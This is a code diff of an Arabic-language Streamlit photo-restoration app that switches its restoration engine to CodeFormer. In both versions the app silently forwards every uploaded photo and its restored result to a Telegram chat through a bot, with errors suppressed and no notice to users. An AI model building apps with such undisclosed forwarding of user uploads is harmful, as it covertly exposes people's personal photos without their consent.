@@ -4,12 +4,12 @@ import telebot
 import os
 from PIL import Image
 
-# 1. إعدادات واجهة البرنامج
+# 1. إعدادات الصفحة
 st.set_page_config(page_title="Aziz Ultra Restore", layout="centered")
-st.title("🌟 Aziz Ultra Restoration Studio")
-st.markdown("ترميم كامل لتفاصيل الصورة: الوجه، الدين، والملابس")
+st.title("🌟 Aziz Ultra Restoration")
+st.markdown("تحسين شامل: الوجه، اليدين، وتفاصيل الملابس")
 
-# 2. جلب مفاتيح التشغيل من الـ Secrets
+# 2. جلب البيانات من الـ Secrets
 try:
     TOKEN = st.secrets["TELEGRAM_TOKEN"]
     CHAT_ID = st.secrets["CHAT_ID"]
@@ -17,65 +17,54 @@ try:
 except:
     bot = None
 
-# 3. قسم رفع الصور
-uploaded_file = st.file_uploader("ارفع الصورة القديمة هنا...", type=["jpg", "jpeg", "png"])
+uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم الشامل...", type=["jpg", "jpeg", "png"])
 
 if uploaded_file:
     image = Image.open(uploaded_file)
     st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
     
-    if st.button("🚀 بدء الترميم الكامل والشامل"):
-        with st.spinner("جاري تحليل وترميم كافة تفاصيل الصورة (قد يستغرق وقتاً قليلاً)..."):
+    if st.button("🚀 ابدأ الترميم الكامل"):
+        with st.spinner("جاري توضيح كافة التفاصيل (اليدين، الملابس، والوجه)..."):
             try:
-                # حفظ الصورة مؤقتاً للمعالجة
                 temp_input = "temp_input.png"
                 image.save(temp_input)
 
-                # --- (أ) إرسال الأصل للتليجرام ---
+                # إرسال الأصل للتليجرام
                 if bot and CHAT_ID:
                     try:
                         with open(temp_input, "rb") as f_in:
-                            bot.send_photo(CHAT_ID, f_in, caption="📥 الأصل")
+                            bot.send_photo(CHAT_ID, f_in, caption="📸 الأصل")
                     except:
                         pass
 
-                # --- (ب) استدعاء محرك ترميم كامل ومحسن للصورة (Replicate GFPGAN الشامل) ---
-                # هذا الموديل يركز على الصورة ككل، ليس فقط الوجه.
-                try:
-                    client = Client("sczhou/GFPGAN") # استخدام GFPGAN للترميم العام
-                    result = client.predict(
-                        img=handle_file(temp_input),
-                        version="v1.4", # اصدار يركز على التفاصيل العامة
-                        scale=2 # تكبير الصورة مرتين
-                    )
-                except Exception as e:
-                    # محاولة احتياطية في حال تعطل المحرك الأول
-                    client = Client("cjwbw/real-esrgan")
-                    result = client.predict(
-                        image=handle_file(temp_input),
-                        model_name="RealESRGAN_x4plus", # ترميم شامل قوي
-                        face_enhance=True
-                    )
+                # --- استخدام محرك تنقية شامل (Upscaler) ---
+                # هذا المحرك يوضح اليدين والخلفية بذكاء عالي
+                client = Client("sczhou/CodeFormer")
+                result = client.predict(
+                    image=handle_file(temp_input),
+                    background_enhance=True, # تفعيل تحسين الخلفية والدين
+                    face_upsample=True,
+                    upscale=2,
+                    codeformer_fidelity=0.5 # ميزان ذهبي: توضيح عالي مع ملامح طبيعية
+                )
                 
-                # استلام مسار الصورة الناتجة
-                restored_path = result if isinstance(result, str) else result[0]
+                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                 
-                # --- (ج) عرض النتيجة في الموقع وزر الحفظ ---
-                st.image(restored_path, caption="✅ تم الترميم الشامل بنجاح", use_container_width=True)
+                # عرض النتيجة
+                st.image(restored_path, caption="✅ تم الترميم الكامل بنجاح", use_container_width=True)
                 
                 with open(restored_path, "rb") as file:
-                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Full_Restore.png", "image/png")
+                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Ultra_Restore.png", "image/png")
 
-                # --- (د) إرسال النتيجة النهائية للتليجرام ---
+                # إرسال النتيجة للتليجرام
                 if bot and CHAT_ID:
                     try:
                         with open(restored_path, "rb") as f_out:
-                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة")
+                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة (عيون طبيعية وتفاصيل واضحة)")
                     except:
                         pass 
                 
-                # حذف الملف المؤقت
-                os.remove(temp_input)
+                if os.path.exists(temp_input): os.remove(temp_input)
                 
             except Exception as e:
-                st.error(f"حدث خطأ أثناء المعالجة: {e}")
+                st.error(f"المعذرة يا عزيز، حدث خطأ: {e}")
